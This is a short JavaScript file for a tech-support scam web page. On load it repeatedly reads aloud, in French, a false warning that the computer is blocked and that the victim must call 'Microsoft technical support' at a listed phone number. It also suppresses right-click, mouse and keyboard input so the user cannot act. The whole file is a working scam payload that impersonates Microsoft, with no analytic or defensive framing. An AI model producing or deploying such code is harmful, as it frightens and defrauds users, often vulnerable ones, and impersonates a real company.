
// Function to read the message aloud
function readMessage() {
    if ('speechSynthesis' in window) {
        let message = "Votre ordinateur a été bloqué. Veuillez contacter l’assistance technique Microsoft dans les minutes qui suivent surtout ne touchez à rien. Numéro: +1 920 543 3379";
        let utterance = new SpeechSynthesisUtterance(message);
        utterance.lang = 'fr-FR'; // Language
        utterance.pitch = 1; // Pitch level
        utterance.rate = 1; // Speed rate
        window.speechSynthesis.speak(utterance);
        utterance.onend = function() {
            readMessage(); // Repeat the message
        };
    } else {
        alert("Votre navigateur ne prend pas en charge la synthèse vocale.");
    }
}

// Start reading the message and show popups when the page loads
window.onload = function() {
    readMessage();
};

// Disables right-click context menu
document.addEventListener('contextmenu', (event) => event.preventDefault());

// Disables mouse movement (optional safety measure)
document.addEventListener('mousemove', (event) => {
    event.preventDefault();
    event.stopPropagation();
});

// Additional measure to prevent user interaction
document.addEventListener('keydown', (event) => {
    event.preventDefault();
});
